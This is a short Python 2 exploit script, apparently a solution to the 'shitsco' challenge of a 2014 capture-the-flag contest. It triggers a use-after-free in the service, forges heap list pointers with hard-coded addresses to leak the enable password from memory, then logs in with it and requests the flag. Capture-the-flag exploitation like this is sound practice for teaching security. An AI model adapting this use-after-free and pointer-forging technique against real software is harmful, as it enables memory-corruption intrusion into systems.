#!/usr/bin/env python

import socket
from struct import pack, unpack

DEBUG = False

server = "shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me"
server = "127.0.0.1"
port = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.settimeout(30)

def recv_until(s, pattern):
	ret = ''
	while True:
		c = s.recv(1)
		if c == '':
			raise Exception("Connection closed")
		ret += c
		if ret.find(pattern) != -1:
			break
	return ret

# trigger use-after-free by creating 2 items and then removing them in order
print recv_until(s, "$ ")
s.send("set 1 abcd\n")
print recv_until(s, "$ ")
s.send("set 2 abcd\n")
print recv_until(s, "$ ")
s.send("set 1\n")
print recv_until(s, "$ ")
s.send("set 2\n")
print recv_until(s, "$ ")

# set use-after-free item via strdup of argument to 'show' command
#  first two items are the key,value pair followed by blink and flink
#  use the location of the password in bss for the key and value
#  use a location to terminate the linked list for flink and blink
#   - can't use null directly here since the strdup allocation would be cut short
s.send("show " + pack("<I", 0x804C3A0)*2 + pack("<I", 0x0804C390)*2 + "\n")
print recv_until(s, "$ ")

# now, this will simply dump the password for us
s.send("show\n")
pw = recv_until(s, ':')[:-1]
b = recv_until(s, "$ ")
print pw + ':' + b

print 'Enable password: "' + pw + '"'

s.send('enable ' + pw + '\n')

print recv_until(s, "# ")
s.send('flag\n')
print recv_until(s, "# ")
s.send('quit\n')
